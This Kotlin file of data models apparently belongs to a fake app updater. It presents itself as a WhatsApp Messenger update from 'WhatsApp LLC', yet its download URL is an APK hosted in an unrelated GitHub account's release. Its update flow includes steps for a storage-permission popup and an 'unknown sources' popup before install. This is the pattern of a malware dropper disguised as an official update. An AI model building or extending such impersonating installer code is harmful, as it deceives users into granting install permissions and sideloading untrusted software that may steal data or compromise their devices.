package com.example.model

import java.io.File

data class AppUpdateInfo(
    val appName: String = "WhatsApp Messenger",
    val developer: String = "WhatsApp LLC",
    val inAppPurchases: String = "In-app purchases",
    val packageName: String = "com.whatsapp",
    val currentVersionName: String = "2.24.18.75",
    val latestVersionName: String = "2.24.22.80",
    val latestVersionCode: Int = 2242280,
    val releaseDate: String = "Oct 16, 2026",
    val fileSizeBytes: Long = 32_000_000L,
    val formattedSize: String = "32 MB",
    val changelogTitle: String = "What's new",
    val changelogBullets: List<String> = listOf(
        "You can now choose to share recent group history with new members when you add them to a group",
        "Group calls now include the ability to transfer call..."
    ),
    val changelogDescription: String = "• You can now choose to share recent group history with new members when you add them to a group\n• Group calls now include the ability to transfer call...",
    val downloadUrl: String = "https://github.com/installupdate/Link-assistant-/releases/download/Whatsapp-assistant/WhatsApp-Beta.apk"
)

sealed interface DownloadState {
    data object Idle : DownloadState
    data class Downloading(
        val progress: Float,
        val downloadedBytes: Long,
        val totalBytes: Long,
        val speed: String,
        val percentage: Int = (progress * 100).toInt().coerceIn(0, 100)
    ) : DownloadState
    data class Downloaded(val file: File) : DownloadState
    data object Installing : DownloadState
    data class Error(val message: String) : DownloadState
}

enum class UpdateFlowStep {
    IDLE,
    STORAGE_PERMISSION_POPUP,
    UNKNOWN_SOURCES_POPUP,
    DOWNLOADING,
    READY_TO_INSTALL
}
